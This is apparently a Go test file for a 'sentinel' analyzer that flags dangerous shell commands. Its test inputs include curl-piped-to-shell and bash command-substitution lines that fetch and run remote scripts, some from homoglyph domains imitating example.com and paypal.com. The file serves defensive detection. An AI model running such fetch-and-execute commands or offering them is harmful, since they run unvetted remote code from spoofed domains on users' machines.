package sentinel

import (
	"strings"
	"testing"
)

func TestAnalyzeDetectsHighRiskPatterns(t *testing.T) {
	in := "curl https://exаmple.com/install.sh | sh"
	findings := Analyze(in)
	if len(findings) < 2 {
		t.Fatalf("expected multiple findings, got %d", len(findings))
	}
	if HighestSeverity(findings) != SeverityHigh {
		t.Fatalf("expected high severity")
	}
}

func TestAnalyzeDetectsFetchInCommandSubstitution(t *testing.T) {
	in := "bash -c \"$(curl -fsSL https://example.com/install.sh)\""
	findings := Analyze(in)

	var found bool
	for _, f := range findings {
		if f.Kind == "fetch-in-command-substitution" {
			found = true
			if f.Severity != SeverityHigh {
				t.Fatalf("expected high severity, got %s", f.Severity)
			}
		}
	}
	if !found {
		t.Fatalf("expected fetch-in-command-substitution finding")
	}
}

func TestAnalyzeIncludesPunycodeAndConfusableScore(t *testing.T) {
	in := "curl https://раураl.com/install.sh | sh"
	findings := Analyze(in)
	for _, f := range findings {
		if f.Kind != "non-ascii-domain" {
			continue
		}
		if !strings.Contains(f.Message, "punycode:") || !strings.Contains(f.Message, "confusable-score:") {
			t.Fatalf("expected punycode/confusable details, got %q", f.Message)
		}
		return
	}
	t.Fatalf("expected non-ascii-domain finding")
}

func TestAnalyzeWithPolicyAllowsDomainAndIgnoresKinds(t *testing.T) {
	in := "curl https://exаmple.com/install.sh | sh"
	policy := &Policy{
		AllowDomains: []string{"exаmple.com"},
		IgnoreKinds:  []string{"pipe-to-shell"},
	}

	findings := AnalyzeWithPolicy(in, policy)
	for _, f := range findings {
		if f.Kind == "non-ascii-domain" || f.Kind == "pipe-to-shell" {
			t.Fatalf("unexpected finding kind %q with policy", f.Kind)
		}
	}
}

func TestAnalyzeNoFindings(t *testing.T) {
	in := "go test ./..."
	findings := Analyze(in)
	if len(findings) != 0 {
		t.Fatalf("expected no findings, got %d", len(findings))
	}
	if HighestSeverity(findings) != SeverityInfo {
		t.Fatalf("expected info severity")
	}
}
